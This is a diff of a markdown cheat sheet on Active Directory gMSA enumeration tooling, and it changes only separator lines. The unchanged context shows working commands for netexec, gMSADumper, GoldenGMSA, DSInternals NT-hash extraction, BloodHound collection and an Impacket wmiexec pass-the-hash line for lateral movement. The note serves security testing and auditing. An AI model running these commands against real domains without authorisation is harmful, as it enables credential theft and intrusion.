@@ -18,7 +18,7 @@ linked:
 ---
 # AD - gMSA Enumeration - Tooling
 
-***
+---
 
 ## netexec / crackmapexec
 
@@ -30,7 +30,7 @@ linked:
 | `nxc ldap <DC> -u u -p p --query "(objectClass=msDS-GroupManagedServiceAccount)" "*"` | Discovery custom | Targeted. |
 ^ad-gmsa-tool-netexec
 
-___
+---
 
 ## gMSADumper (Python)
 
@@ -47,7 +47,7 @@ pip install -r gMSADumper/requirements.txt
 python3 gMSADumper/gMSADumper.py -u auditor -p 'Pass!' -d corp.local -l <DC>
 ```
 
-___
+---
 
 ## GoldenGMSA
 
@@ -70,7 +70,7 @@ GoldenGMSA.exe gmsainfo --sid S-1-5-21-... > gmsa.json
 GoldenGMSA.exe compute --kdskey "..." --sid "..." --pwdid "..."
 ```
 
-___
+---
 
 ## DSInternals (PowerShell)
 
@@ -92,7 +92,7 @@ $pwd = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
 $pwd.SecureCurrentPassword | ConvertTo-NTHash
 ```
 
-___
+---
 
 ## Native PowerShell (RSAT)
 
@@ -106,7 +106,7 @@ ___
 | `Get-KdsRootKey` | KDS Root Keys (priv) | Forensic. |
 ^ad-gmsa-tool-rsat
 
-___
+---
 
 ## BloodHound gMSA
 
@@ -125,7 +125,7 @@ ___
 bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
 ```
 
-___
+---
 
 ## Linux / Impacket
 
@@ -138,7 +138,7 @@ ___
 | `wmiexec.py -hashes :<NT> 'corp.local/<gMSA>$@<target>'` | RCE como gMSA | Lateral. |
 ^ad-gmsa-tool-linux
 
-___
+---
 
 ## Recursos
 
@@ -154,4 +154,4 @@ ___
 | The Hacker Recipes — gMSA | `https://www.thehacker.recipes/ad/movement/credentials/dumping/gmsa` |
 ^ad-gmsa-tool-resources
 
-***
+---
